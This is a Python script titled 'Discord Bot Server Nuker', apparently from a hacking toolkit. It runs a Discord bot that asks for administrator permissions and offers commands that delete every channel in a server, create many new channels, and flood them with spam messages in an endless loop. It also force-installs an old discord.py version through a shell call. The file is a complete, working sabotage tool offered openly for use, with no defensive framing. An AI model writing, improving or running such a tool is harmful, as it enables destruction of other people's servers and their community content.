from Config.Util import *
from Config.Config import *
try:
    from importlib.metadata import version, PackageNotFoundError
    import pkg_resources
except Exception as e:
   ErrorModule(e)
   
Title("Discord Bot Server Nuker")

try:
    token = input(f"{color.BLUE}\n{INPUT}Token Bot -> {color.RESET}")
    prefix = "!"

    discord_py_version = None
    for package in pkg_resources.working_set:
        if package.key == 'discord.py':
            discord_py_version = package.version
            break

    if discord_py_version == '1.6.0':
        pass
    else:
        print(f"{color.BLUE}{INFO} Installing discord.py version 1.6.0: (please put \"y\" so that it uninstalls to better reinstall){color.RESET}\n")
        os.system("pip install discord.py==1.6.0")
        time.sleep(5)

    Clear()
    import discord
    from discord.ext import commands, tasks
    from discord import Activity, ActivityType

    intents = discord.Intents.default()
    intents.guilds = True
    intents.messages = True  

    bot = commands.Bot(command_prefix=prefix, intents=intents)

    created_channel_ids = []

    try:
        @bot.event
        async def on_ready():
            await bot.change_presence(activity=Activity(type=ActivityType.playing, name=f"{github_tool}"))
            print(F"""{color.BLUE}
                ██████ ▓█████  ██▀███   ██▒   █▓▓█████  ██▀███      ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
                ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                ░ ▓██▄   ▒███   ▓██ ░▄█ ▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
                ▒   ██▒▒▓█  ▄ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ▒██▀▀█▄     ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                ▒██████▒▒░▒████▒░██▓ ▒██▒   ▒▀█░  ░▒████▒░██▓ ▒██▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
                ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                ░  ░     ░     ░░   ░      ░░     ░     ░░   ░       ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                    ░     ░  ░   ░           ░     ░  ░   ░                 ░    ░     ░  ░      ░  ░   ░     
                                            ░                                                                 """)
            print("""{BLUE}Bot Informations:
    {BLUE}> Token  : {WHITE}{token}
    {BLUE}> Invite : {WHITE}https://discord.com/oauth2/authorize?client_id={0.user.id}&scope=bot&permissions=8
    {BLUE}> Name   : {WHITE}{0.user.name}  
    {BLUE}> Id     : {WHITE}{0.user.id}
    {BLUE}> Prefix : {WHITE}{prefix}
    {BLUE}> Status : {WHITE}Online""".format(bot, BLUE=color.BLUE, WHITE=color.WHITE, token=token, prefix=prefix))
            
            print(f"""
    {color.BLUE}Bot Commands:
    > {prefix}nuke {color.LIGHTRED_EX}<Channels Number>{color.BLUE} - {color.LIGHTRED_EX}<Channels Name>{color.BLUE} - {color.LIGHTRED_EX}<Message Spam>
    {color.WHITE}Delete all channels and create other channels and spam messages.{color.BLUE}
    > {prefix}spam_channels {color.LIGHTRED_EX}<Channels Number>{color.BLUE} - {color.LIGHTRED_EX}<Channels Name>{color.BLUE} - {color.LIGHTRED_EX}<Message Spam>
    {color.WHITE}Created channels that spam messages.{color.BLUE}
    > {prefix}delete_channels
    {color.WHITE}Delete all channels from the server.{color.BLUE}

    {color.BLUE}Logs:{color.RESET}""")
    except:
        ErrorToken()

    @bot.command()
    async def nuke(ctx, *, args):
        global message_to_send
        print(f"{color.BLUE}[>] | Command: {color.WHITE}{prefix}nuke")
        args_list = args.split("-")
        if len(args_list) != 3:
            print(f"{color.BLUE}[>] | Invalid Argument !")
            return
        
        try:
            number = int(args_list[0])
        except ValueError:
            print(f"{color.BLUE}[>] | Invalid Number !")
            return

        channel_name = args_list[1]
        message = args_list[2]

        message_to_send = message

        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{color.BLUE}[+] | Channel Delete: {color.WHITE}{channel.name} ({channel.id})")   
            except Exception as e:
                print(f"{color.BLUE}[+] | Channel Not Delete: {color.WHITE}{channel.name} ({channel.id}){color.BLUE} | Error: {color.WHITE}{e}")

        created_channel_ids.clear()

        guild = ctx.guild
        for i in range(number):
            new_channel = await guild.create_text_channel(f"{channel_name}")
            print(f"{color.BLUE}[+] | Channel Create: {color.WHITE}{channel_name}")
            await new_channel.send(message_to_send)
            print(f"{color.BLUE}[+] | Message Send: {color.WHITE}{message_to_send}")
            created_channel_ids.append(new_channel.id)
        send_message_loop.start()


    @bot.command()
    async def spam_channels(ctx, *, args):
        global message_to_send
        print(f"{color.BLUE}[>] | Command: {color.WHITE}{prefix}spam_channels")
        args_list = args.split(" - ")
        if len(args_list) != 3:
            print(f"{color.BLUE}[>] | Invalid Argument !")
            return
        
        try:
            number = int(args_list[0])
        except ValueError:
            print(f"{color.BLUE}[>] | Invalid Number !")
            return

        channel_name = args_list[1]
        message = args_list[2]

        message_to_send = message

        guild = ctx.guild
        for i in range(number):
            new_channel = await guild.create_text_channel(f"{channel_name}")
            print(f"{color.BLUE}[+] | Channel Create: {color.WHITE}{channel_name}")
            await new_channel.send(message_to_send)
            print(f"{color.BLUE}[+] | Message Send: {color.WHITE}{message_to_send}")
            created_channel_ids.append(new_channel.id)
        send_message_loop.start()


    @tasks.loop()
    async def send_message_loop():
        global message_to_send

        for channel_id in created_channel_ids:
            channel = bot.get_channel(channel_id)
            if channel:
                try:
                    await channel.send(message_to_send)
                    print(f"{color.BLUE}[+] | Message Send: {color.WHITE}{message_to_send}")
                except Exception as e:
                    print(f"{color.BLUE}[X] | Message Not Send: {color.WHITE}{message_to_send}{color.BLUE} | Error: {color.WHITE}{e}")


    @bot.command()
    async def delete_channels(ctx):
        print(f"{color.BLUE}[>] | Command: {color.WHITE}{prefix}delete_channels")
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{color.BLUE}[+] | Channel Delete: {color.WHITE}{channel.name} ({channel.id})")   
            except Exception as e:
                print(f"{color.BLUE}[+] | Channel Not Delete: {color.WHITE}{channel.name} ({channel.id}){color.BLUE} | Error: {color.WHITE}{e}")

        created_channel_ids.clear()
        send_message_loop.stop()
    try:
        bot.run(token)
    except:
        ErrorToken()
except Exception as e:
    Error(e)